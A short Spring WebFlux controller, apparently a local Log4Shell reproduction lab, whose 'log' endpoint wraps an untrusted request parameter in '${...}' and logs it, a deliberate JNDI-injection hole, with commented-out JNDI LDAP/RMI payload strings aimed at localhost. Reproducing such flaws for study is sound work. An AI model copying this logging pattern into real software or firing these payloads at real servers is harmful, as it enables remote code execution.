package io.reactive.asweb.controller;

import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import reactor.core.publisher.Mono;

@RestController
@Slf4j
public class WebController {

    @GetMapping("hello")
    Mono<String> hello() {
        return Mono.just("hello mono");
    }

    @GetMapping("log")
    String log(@RequestParam String message) {
//        log.error("${jndi:rmi://127.0.0.1:1099/pwd}");
//        log.error("${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
//
//        log.error("${jndi:ldap://127.0.0.1:1389/#Exploit}");
//        log.error("${}", "jndi:ldap://127.0.0.1:1389/#Exploit");
        log.error("${" + message + "}");
        return message;
    }
}
